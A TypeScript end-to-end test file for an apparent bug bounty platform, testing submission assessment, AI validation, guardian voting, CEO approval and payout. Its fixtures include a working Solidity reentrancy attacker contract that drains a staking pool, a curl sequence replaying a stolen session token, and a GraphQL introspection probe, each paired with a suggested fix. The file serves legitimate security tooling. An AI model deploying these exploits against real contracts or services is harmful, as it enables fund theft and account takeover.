/**
 * Bug Bounty End-to-End Tests
 * 
 * Comprehensive tests with REAL APIs - Groq, Anthropic, DWS
 * Tests the complete flow from submission to payout
 */

import { describe, test, expect, beforeAll, afterAll, setDefaultTimeout } from 'bun:test';
import { parseEther, formatEther, type Address } from 'viem';
import { Hono } from 'hono';

// Set timeout for API calls
setDefaultTimeout(120000);

// ============ Configuration ============

const GROQ_API_KEY = process.env.GROQ_API_KEY;
const ANTHROPIC_API_KEY = process.env.ANTHROPIC_API_KEY;
const DWS_URL = process.env.DWS_URL ?? 'http://localhost:4030';

// Import services
import {
  getBugBountyService,
  assessSubmission,
  type BountySubmissionDraft,
} from '../src/bug-bounty-service';
import { validateSubmission } from '../src/security-validation-agent';
import {
  createSandboxConfig,
  getSandboxImageForVulnType,
  getSandboxStats,
} from '../src/sandbox-executor';
import { createBugBountyServer } from '../src/bug-bounty-routes';
import {
  BountySeverity,
  VulnerabilityType,
  BountySubmissionStatus,
  ValidationResult,
} from '../src/types';

// ============ Test Data ============

const TEST_RESEARCHER: Address = '0x1234567890123456789012345678901234567890';
const TEST_GUARDIAN_1: Address = '0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
const TEST_GUARDIAN_2: Address = '0xBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB';
const TEST_GUARDIAN_3: Address = '0xCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC';
const TEST_GUARDIAN_4: Address = '0xDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD';
const TEST_GUARDIAN_5: Address = '0xEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE';

const CRITICAL_VULNERABILITY: BountySubmissionDraft = {
  severity: BountySeverity.CRITICAL,
  vulnType: VulnerabilityType.WALLET_DRAIN,
  title: 'Reentrancy Attack in StakingPool.sol Allows Complete Fund Drain',
  summary: `Critical reentrancy vulnerability discovered in the withdrawStake() function of StakingPool.sol. 
The function sends ETH to users before updating their balance, enabling recursive withdrawal attacks. 
Estimated $10M+ at risk across all staking pools.`,
  description: `A critical reentrancy vulnerability exists in the StakingPool contract at line 142 in the withdrawStake function.

The vulnerable code pattern:
\`\`\`solidity
function withdrawStake(uint256 amount) external {
    require(stakes[msg.sender] >= amount, "Insufficient balance");
    
    // BUG: External call before state update
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");
    
    // State update happens AFTER external call
    stakes[msg.sender] -= amount;
}
\`\`\`

An attacker can exploit this by deploying a malicious contract with a receive() function that recursively calls withdrawStake() before the balance is decremented. This allows draining the entire pool in a single transaction.

Impact Analysis:
- All staked funds (approximately $10M across pools) are at immediate risk
- Attack is trivially exploitable with minimal gas costs
- No special permissions or complex setup required
- Attack can be performed by any EOA or contract

The vulnerability affects all deployed instances of StakingPool on mainnet, testnet, and any forks.`,
  affectedComponents: ['StakingPool.sol', 'contracts/staking/StakingPool.sol', 'Treasury'],
  stepsToReproduce: [
    'Deploy the malicious Attacker contract with the fallback function',
    'Call attacker.attack() with 1 ETH as initial stake',
    'The receive() function recursively calls withdrawStake()',
    'Observe the entire pool balance being drained',
    'Verify attacker contract balance equals previous pool balance',
  ],
  proofOfConcept: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IStakingPool {
    function stake() external payable;
    function withdrawStake(uint256 amount) external;
}

contract Attacker {
    IStakingPool public target;
    uint256 public drainAmount = 1 ether;
    
    constructor(address _target) {
        target = IStakingPool(_target);
    }
    
    function attack() external payable {
        require(msg.value >= drainAmount, "Need initial stake");
        target.stake{value: msg.value}();
        target.withdrawStake(drainAmount);
    }
    
    receive() external payable {
        if (address(target).balance >= drainAmount) {
            target.withdrawStake(drainAmount);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// Foundry test proof:
// forge test --match-test testReentrancyExploit -vvvv`,
  suggestedFix: `Apply the checks-effects-interactions pattern and add ReentrancyGuard:

\`\`\`solidity
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract StakingPool is ReentrancyGuard {
    function withdrawStake(uint256 amount) external nonReentrant {
        require(stakes[msg.sender] >= amount, "Insufficient balance");
        
        // Effect: Update state BEFORE interaction
        stakes[msg.sender] -= amount;
        
        // Interaction: External call AFTER state update
        (bool success, ) = msg.sender.call{value: amount}("");
        require(success, "Transfer failed");
    }
}
\`\`\`

Additional recommendations:
1. Use OpenZeppelin's ReentrancyGuard modifier
2. Consider using a pull-payment pattern instead of push
3. Add a timelock on withdrawals for large amounts
4. Implement circuit breaker for emergency pause`,
  stake: '0.1', // Higher stake for critical
};

const HIGH_VULNERABILITY: BountySubmissionDraft = {
  severity: BountySeverity.HIGH,
  vulnType: VulnerabilityType.PRIVILEGE_ESCALATION,
  title: 'API Token Reuse Vulnerability Enables Cross-Session Account Access',
  summary: 'Session tokens are not properly invalidated after logout, allowing attackers to reuse old tokens to access victim accounts for up to 24 hours after session termination.',
  description: `A privilege escalation vulnerability exists in the authentication system where session tokens remain valid after user logout.

When a user logs out:
1. The frontend clears the token from localStorage
2. However, the backend does NOT invalidate the token in Redis
3. Tokens have a 24-hour TTL regardless of logout state

This allows an attacker who has captured a valid token (via XSS, MITM, or physical access) to continue using it even after the legitimate user has logged out.

Technical Details:
- Token format: JWT with HS256 signature
- Token storage: Redis with 24h TTL
- Logout implementation: frontend-only, no backend invalidation
- Affected endpoints: All authenticated API routes

The vulnerability is particularly concerning because:
- Users expect logout to terminate all sessions
- Password changes also don't invalidate existing tokens
- No "logout all devices" functionality exists`,
  affectedComponents: ['Auth Service', 'Session Manager', 'API Gateway'],
  stepsToReproduce: [
    'User A logs in and captures their JWT token',
    'User A logs out via the web interface',
    'Using captured token, make API request to /api/user/profile',
    'Observe that the request succeeds with valid user data',
    'Token remains valid for the full 24-hour TTL period',
  ],
  proofOfConcept: `# Capture token before logout
TOKEN=$(curl -s -X POST https://api.target.com/auth/login \\
  -H "Content-Type: application/json" \\
  -d '{"email":"test@test.com","password":"password123"}' \\
  | jq -r '.token')

# User logs out (only clears frontend, not backend)
curl -X POST https://api.target.com/auth/logout \\
  -H "Authorization: Bearer $TOKEN"

# Wait a few minutes...
sleep 300

# Token still works!
curl -s https://api.target.com/api/user/profile \\
  -H "Authorization: Bearer $TOKEN"
# Returns: {"id": "123", "email": "test@test.com", ...}`,
  suggestedFix: `1. Implement proper token revocation on logout:
\`\`\`typescript
async function logout(token: string) {
  await redis.del(\`session:\${token}\`);
  await redis.sadd(\`revoked:\${token}\`, Date.now());
}
\`\`\`

2. Add token validation middleware:
\`\`\`typescript
async function validateToken(token: string) {
  const isRevoked = await redis.sismember('revoked', token);
  if (isRevoked) throw new UnauthorizedError();
}
\`\`\``,
  stake: '0.05',
};

const MEDIUM_VULNERABILITY: BountySubmissionDraft = {
  severity: BountySeverity.MEDIUM,
  vulnType: VulnerabilityType.INFORMATION_DISCLOSURE,
  title: 'GraphQL Introspection Exposes Internal API Schema',
  summary: 'GraphQL introspection is enabled in production, exposing the complete API schema including internal endpoints, deprecated fields, and argument types.',
  description: `GraphQL introspection queries are allowed in production, exposing the complete API schema.

Impact:
- Attackers can discover all available queries and mutations
- Internal fields marked @deprecated are visible
- Hidden admin endpoints are exposed
- Authentication requirements for each endpoint are revealed

This significantly aids reconnaissance for further attacks.`,
  affectedComponents: ['GraphQL Server', 'API'],
  stepsToReproduce: [
    'Send introspection query to /graphql endpoint',
    'Review the __schema response',
    'Note internal and admin mutations',
  ],
  proofOfConcept: `curl -X POST https://api.target.com/graphql \\
  -H "Content-Type: application/json" \\
  -d '{"query": "{ __schema { types { name fields { name } } } }"}'`,
  suggestedFix: 'Disable introspection in production: `introspection: process.env.NODE_ENV !== "production"`',
  stake: '0.01',
};

// ============ AI Provider Tests ============

describe('1. AI Provider Verification', () => {
  test('Groq API responds correctly', async () => {
    if (!GROQ_API_KEY) {
      console.log('GROQ_API_KEY not set, skipping');
      return;
    }

    const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${GROQ_API_KEY}`,
      },
      body: JSON.stringify({
        model: 'llama-3.3-70b-versatile',
        messages: [
          { role: 'system', content: 'You are a security expert.' },
          { role: 'user', content: 'What is a reentrancy attack? One sentence.' },
        ],
        max_tokens: 100,
      }),
    });

    expect(response.ok).toBe(true);
    const data = await response.json() as { choices: Array<{ message: { content: string } }> };
    console.log('Groq response:', data.choices[0].message.content);
    expect(data.choices[0].message.content.toLowerCase()).toContain('reentran');
  });

  test('Anthropic API responds correctly', async () => {
    if (!ANTHROPIC_API_KEY) {
      console.log('ANTHROPIC_API_KEY not set, skipping');
      return;
    }

    const response = await fetch('https://api.anthropic.com/v1/messages', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-api-key': ANTHROPIC_API_KEY,
        'anthropic-version': '2023-06-01',
      },
      body: JSON.stringify({
        model: 'claude-sonnet-4-20250514',
        max_tokens: 100,
        messages: [
          { role: 'user', content: 'What is a wallet drain attack? One sentence.' },
        ],
      }),
    });

    expect(response.ok).toBe(true);
    const data = await response.json() as { content: Array<{ text: string }> };
    console.log('Anthropic response:', data.content[0].text);
    expect(data.content[0].text.length).toBeGreaterThan(20);
  });
});

// ============ DWS Integration Tests ============

describe('2. DWS Compute Integration', () => {
  test('DWS health check', async () => {
    const response = await fetch(`${DWS_URL}/compute/health`, {
      signal: AbortSignal.timeout(5000),
    }).catch(() => null);

    if (!response?.ok) {
      console.log('DWS not running, skipping DWS tests');
      return;
    }

    const data = await response.json() as { service: string; status: string };
    console.log('DWS Health:', data);
    expect(data.status).toBe('healthy');
  });

  test('DWS inference with Groq routing', async () => {
    const response = await fetch(`${DWS_URL}/compute/chat/completions`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        messages: [
          { role: 'system', content: 'You are a security expert.' },
          { role: 'user', content: 'Is a reentrancy attack dangerous? Yes or no.' },
        ],
        max_tokens: 10,
      }),
      signal: AbortSignal.timeout(30000),
    }).catch(() => null);

    if (!response?.ok) {
      console.log('DWS inference not available');
      return;
    }

    const data = await response.json() as {
      choices: Array<{ message: { content: string } }>;
      provider: string;
      model: string;
    };

    console.log('DWS inference - Provider:', data.provider, 'Model:', data.model);
    console.log('Response:', data.choices[0].message.content);
    expect(data.provider).toBeDefined();
    expect(data.choices[0].message.content.toLowerCase()).toMatch(/yes/);
  });
});

// ============ Assessment Tests ============

describe('3. Submission Assessment', () => {
  test('CRITICAL vulnerability assessment', () => {
    const assessment = assessSubmission(CRITICAL_VULNERABILITY);
    
    console.log('CRITICAL Assessment:', {
      severityScore: assessment.severityScore,
      impactScore: assessment.impactScore,
      exploitabilityScore: assessment.exploitabilityScore,
      isImmediateThreat: assessment.isImmediateThreat,
      validationPriority: assessment.validationPriority,
      readyToSubmit: assessment.readyToSubmit,
    });

    expect(assessment.severityScore).toBe(100); // 4 * 25
    expect(assessment.impactScore).toBe(100); // 10 * 10 for wallet drain
    expect(assessment.isImmediateThreat).toBe(true);
    expect(assessment.validationPriority).toBe('critical');
    expect(assessment.readyToSubmit).toBe(true);
  });

  test('HIGH vulnerability assessment', () => {
    const assessment = assessSubmission(HIGH_VULNERABILITY);
    
    console.log('HIGH Assessment:', {
      severityScore: assessment.severityScore,
      impactScore: assessment.impactScore,
      validationPriority: assessment.validationPriority,
    });

    expect(assessment.severityScore).toBe(75); // 3 * 25
    expect(assessment.impactScore).toBe(70); // 7 * 10 for privilege escalation
    expect(assessment.validationPriority).toBe('high');
  });

  test('MEDIUM vulnerability assessment', () => {
    const assessment = assessSubmission(MEDIUM_VULNERABILITY);
    
    console.log('MEDIUM Assessment:', {
      severityScore: assessment.severityScore,
      impactScore: assessment.impactScore,
      validationPriority: assessment.validationPriority,
    });

    expect(assessment.severityScore).toBe(50); // 2 * 25
    expect(assessment.validationPriority).toBe('medium');
  });
});

// ============ Security Validation Agent Tests ============

describe('4. Security Validation Agent with Real AI', () => {
  test('Validate CRITICAL vulnerability with AI analysis', async () => {
    if (!ANTHROPIC_API_KEY && !GROQ_API_KEY) {
      console.log('No AI provider available, skipping');
      return;
    }

    const validationContext = {
      submissionId: '0x1234567890abcdef',
      severity: CRITICAL_VULNERABILITY.severity,
      vulnType: CRITICAL_VULNERABILITY.vulnType,
      title: CRITICAL_VULNERABILITY.title,
      description: CRITICAL_VULNERABILITY.description,
      affectedComponents: CRITICAL_VULNERABILITY.affectedComponents,
      stepsToReproduce: CRITICAL_VULNERABILITY.stepsToReproduce,
      proofOfConcept: CRITICAL_VULNERABILITY.proofOfConcept ?? '',
      suggestedFix: CRITICAL_VULNERABILITY.suggestedFix ?? '',
    };

    const report = await validateSubmission(validationContext);

    console.log('\n=== CRITICAL Vulnerability Validation Report ===');
    console.log('Result:', ValidationResult[report.result]);
    console.log('Confidence:', report.confidence);
    console.log('Exploit Verified:', report.exploitVerified);
    console.log('Severity Assessment:', BountySeverity[report.severityAssessment]);
    console.log('Suggested Reward:', formatEther(report.suggestedReward), 'ETH');
    console.log('Notes:', report.securityNotes.slice(0, 3));
    console.log('Impact:', report.impactAssessment.slice(0, 200));

    // Without sandbox, result may be NEEDS_MORE_INFO (sandbox unavailable)
    // With sandbox running, expect VERIFIED or LIKELY_VALID
    expect(report.result).toBeOneOf([
      ValidationResult.VERIFIED,
      ValidationResult.LIKELY_VALID,
      ValidationResult.NEEDS_MORE_INFO, // When sandbox unavailable
    ]);
    expect(report.confidence).toBeGreaterThanOrEqual(40);
    expect(report.severityAssessment).toBeOneOf([BountySeverity.CRITICAL, BountySeverity.HIGH]);
  });

  test('Validate HIGH vulnerability with AI analysis', async () => {
    if (!ANTHROPIC_API_KEY && !GROQ_API_KEY) {
      console.log('No AI provider available, skipping');
      return;
    }

    const validationContext = {
      submissionId: '0xabcdef1234567890',
      severity: HIGH_VULNERABILITY.severity,
      vulnType: HIGH_VULNERABILITY.vulnType,
      title: HIGH_VULNERABILITY.title,
      description: HIGH_VULNERABILITY.description,
      affectedComponents: HIGH_VULNERABILITY.affectedComponents,
      stepsToReproduce: HIGH_VULNERABILITY.stepsToReproduce,
      proofOfConcept: HIGH_VULNERABILITY.proofOfConcept ?? '',
      suggestedFix: HIGH_VULNERABILITY.suggestedFix ?? '',
    };

    const report = await validateSubmission(validationContext);

    console.log('\n=== HIGH Vulnerability Validation Report ===');
    console.log('Result:', ValidationResult[report.result]);
    console.log('Confidence:', report.confidence);
    console.log('Severity Assessment:', BountySeverity[report.severityAssessment]);
    console.log('Suggested Reward:', formatEther(report.suggestedReward), 'ETH');

    expect(report.confidence).toBeGreaterThan(40);
  });
});

// ============ Full Flow Tests ============

describe('5. Complete Bug Bounty Flow', () => {
  const service = getBugBountyService();

  test('Submit CRITICAL vulnerability and complete full flow', async () => {
    console.log('\n=== Starting CRITICAL Bug Bounty Flow ===');

    // Step 1: Submit
    console.log('\nStep 1: Submitting vulnerability...');
    const submission = await service.submit(CRITICAL_VULNERABILITY, TEST_RESEARCHER, 1n);
    
    expect(submission.submissionId).toBeDefined();
    expect(submission.status).toBeOneOf([
      BountySubmissionStatus.PENDING,
      BountySubmissionStatus.VALIDATING,
      BountySubmissionStatus.GUARDIAN_REVIEW,
    ]);
    console.log(`Submission ID: ${submission.submissionId.slice(0, 16)}...`);
    console.log(`Status: ${BountySubmissionStatus[submission.status]}`);

    // Step 2: Complete validation (simulating automated validation result)
    console.log('\nStep 2: Completing validation...');
    const validated = service.completeValidation(
      submission.submissionId,
      ValidationResult.VERIFIED,
      'Exploit verified in sandbox environment. Reentrancy confirmed.'
    );
    expect(validated.status).toBe(BountySubmissionStatus.GUARDIAN_REVIEW);
    console.log(`Status after validation: ${BountySubmissionStatus[validated.status]}`);

    // Step 3: Guardian votes
    console.log('\nStep 3: Guardian voting...');
    const reward25ETH = parseEther('25');
    const reward30ETH = parseEther('30');
    const reward28ETH = parseEther('28');

    service.guardianVote(submission.submissionId, TEST_GUARDIAN_1, 1n, true, reward25ETH, 'Valid critical vulnerability');
    service.guardianVote(submission.submissionId, TEST_GUARDIAN_2, 2n, true, reward30ETH, 'Confirmed reentrancy attack');
    service.guardianVote(submission.submissionId, TEST_GUARDIAN_3, 3n, true, reward28ETH, 'Immediate threat verified');
    service.guardianVote(submission.submissionId, TEST_GUARDIAN_4, 4n, true, reward25ETH, 'Critical - max priority');
    
    // 5th vote should trigger CEO review for CRITICAL
    const vote5 = service.guardianVote(submission.submissionId, TEST_GUARDIAN_5, 5n, true, reward30ETH, 'Approve for CEO review');
    
    const afterVotes = service.get(submission.submissionId);
    expect(afterVotes?.status).toBe(BountySubmissionStatus.CEO_REVIEW);
    console.log(`Status after voting: ${BountySubmissionStatus[afterVotes!.status]}`);
    console.log(`Guardian approvals: ${afterVotes?.guardianApprovals}`);
    console.log(`Suggested reward: ${formatEther(afterVotes?.rewardAmount ?? 0n)} ETH`);

    // Step 4: CEO Decision
    console.log('\nStep 4: CEO Decision...');
    const finalReward = parseEther('27.6'); // Weighted decision
    const approved = service.ceoDecision(
      submission.submissionId,
      true,
      finalReward,
      'Critical reentrancy vulnerability confirmed. Immediate fix required. Approved for maximum tier payout.'
    );

    expect(approved.status).toBe(BountySubmissionStatus.APPROVED);
    console.log(`Status after CEO: ${BountySubmissionStatus[approved.status]}`);
    console.log(`Final reward: ${formatEther(approved.rewardAmount)} ETH`);

    // Step 5: Payout
    console.log('\nStep 5: Processing payout...');
    const payout = await service.payReward(submission.submissionId);
    
    const afterPayout = service.get(submission.submissionId);
    expect(afterPayout?.status).toBe(BountySubmissionStatus.PAID);
    console.log(`Payout TX: ${payout.txHash.slice(0, 16)}...`);
    console.log(`Amount: ${formatEther(payout.amount)} ETH`);

    // Step 6: Record fix
    console.log('\nStep 6: Recording fix...');
    const fixed = service.recordFix(
      submission.submissionId,
      '0xabc123def456789' // Fix commit hash
    );
    expect(fixed.fixCommitHash).toBe('0xabc123def456789');
    console.log(`Fix recorded. Disclosure scheduled: ${new Date(fixed.disclosureDate * 1000).toISOString()}`);

    // Final stats
    console.log('\n=== Flow Complete ===');
    const researcherStats = service.getResearcherStats(TEST_RESEARCHER);
    console.log('Researcher Stats:', {
      totalSubmissions: researcherStats.totalSubmissions,
      approvedCount: researcherStats.approvedCount,
      totalEarned: formatEther(researcherStats.totalEarned) + ' ETH',
      reputation: researcherStats.reputation,
    });

    const poolStats = service.getPoolStats();
    console.log('Pool Stats:', {
      activeSubmissions: poolStats.activeSubmissions,
      totalPaidOut: formatEther(poolStats.totalPaidOut) + ' ETH',
    });
  });

  test('Submit and reject invalid submission', async () => {
    console.log('\n=== Testing Rejection Flow ===');

    const invalidSubmission: BountySubmissionDraft = {
      severity: BountySeverity.CRITICAL,
      vulnType: VulnerabilityType.WALLET_DRAIN,
      title: 'Fake vulnerability for testing rejection',
      summary: 'This is a test submission that should be rejected during validation. The vulnerability description is intentionally vague and lacks technical details.',
      description: 'This is a test submission with insufficient details. No real vulnerability here. Just testing the rejection flow. The description does not contain any technical details about the supposed vulnerability and should fail validation.',
      affectedComponents: ['Unknown'],
      stepsToReproduce: ['Step 1', 'Step 2'],
      proofOfConcept: 'console.log("not a real PoC");',
      stake: '0.01',
    };

    const submission = await service.submit(invalidSubmission, TEST_RESEARCHER, 2n);
    console.log(`Submitted: ${submission.submissionId.slice(0, 16)}...`);

    // Complete validation with INVALID result
    const validated = service.completeValidation(
      submission.submissionId,
      ValidationResult.INVALID,
      'Insufficient technical details. No exploitable vulnerability demonstrated.'
    );

    expect(validated.status).toBe(BountySubmissionStatus.REJECTED);
    console.log(`Status: ${BountySubmissionStatus[validated.status]}`);
    console.log(`Notes: ${validated.validationNotes}`);
  });
});

// ============ Sandbox Configuration Tests ============

describe('6. Sandbox Configuration', () => {
  test('EVM vulnerability gets correct sandbox', () => {
    const image = getSandboxImageForVulnType(VulnerabilityType.WALLET_DRAIN);
    expect(image).toContain('evm');

    const config = createSandboxConfig(
      VulnerabilityType.WALLET_DRAIN,
      CRITICAL_VULNERABILITY.proofOfConcept ?? ''
    );

    console.log('EVM Sandbox Config:', {
      image: config.imageRef,
      command: config.command,
      cpuCores: config.resources.cpuCores,
      memoryMb: config.resources.memoryMb,
      timeout: config.timeout,
      networkEnabled: config.resources.networkBandwidthMbps > 0,
    });

    expect(config.resources.memoryMb).toBeGreaterThanOrEqual(4096);
    expect(config.command).toContain('validate-evm');
  });

  test('RCE vulnerability gets isolated sandbox', () => {
    const config = createSandboxConfig(
      VulnerabilityType.REMOTE_CODE_EXECUTION,
      'echo "test"'
    );

    console.log('RCE Sandbox Config:', {
      image: config.imageRef,
      memoryMb: config.resources.memoryMb,
      timeout: config.timeout,
      securityProfile: config.securityOptions.seccompProfile,
    });

    expect(config.imageRef).toContain('isolated');
    expect(config.resources.memoryMb).toBeLessThanOrEqual(1024);
    expect(config.securityOptions.noNetwork).toBe(true);
    expect(config.securityOptions.seccompProfile).toBe('paranoid');
  });
});

// ============ API Routes Test ============

describe('7. Bug Bounty API Routes', () => {
  const app = createBugBountyServer();

  test('GET /stats returns pool stats', async () => {
    const res = await app.request('/stats');
    expect(res.status).toBe(200);
    
    const data = await res.json() as { activeSubmissions: number };
    console.log('Pool Stats API:', data);
    expect(typeof data.activeSubmissions).toBe('number');
  });

  test('GET /submissions returns list', async () => {
    const res = await app.request('/submissions?limit=10');
    expect(res.status).toBe(200);
    
    const data = await res.json() as { submissions: Array<{ title: string }>; total: number };
    console.log('Submissions API:', { total: data.total });
    expect(Array.isArray(data.submissions)).toBe(true);
  });

  test('POST /assess returns assessment', async () => {
    const res = await app.request('/assess', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(CRITICAL_VULNERABILITY),
    });
    expect(res.status).toBe(200);

    const data = await res.json() as { severityScore: number; readyToSubmit: boolean };
    console.log('Assessment API:', data);
    expect(data.severityScore).toBe(100);
    expect(data.readyToSubmit).toBe(true);
  });

  test('GET /sandbox/stats returns sandbox metrics', async () => {
    const res = await app.request('/sandbox/stats');
    expect(res.status).toBe(200);
    
    const data = await res.json() as { activeJobs: number };
    console.log('Sandbox Stats API:', data);
    expect(typeof data.activeJobs).toBe('number');
  });
});

// ============ Summary ============

describe('8. Test Summary', () => {
  test('Print final summary', () => {
    console.log('\n' + '='.repeat(70));
    console.log('BUG BOUNTY E2E TEST SUMMARY');
    console.log('='.repeat(70));
    console.log(`\nAPI Configuration:`);
    console.log(`  - GROQ_API_KEY: ${GROQ_API_KEY ? 'SET' : 'NOT SET'}`);
    console.log(`  - ANTHROPIC_API_KEY: ${ANTHROPIC_API_KEY ? 'SET' : 'NOT SET'}`);
    console.log(`  - DWS_URL: ${DWS_URL}`);
    console.log(`\nTests Completed:`);
    console.log(`  - AI Provider Verification`);
    console.log(`  - DWS Compute Integration`);
    console.log(`  - Submission Assessment`);
    console.log(`  - Security Validation Agent with Real AI`);
    console.log(`  - Complete Bug Bounty Flow`);
    console.log(`  - Sandbox Configuration`);
    console.log(`  - API Routes`);
    console.log('='.repeat(70) + '\n');
    
    expect(true).toBe(true);
  });
});

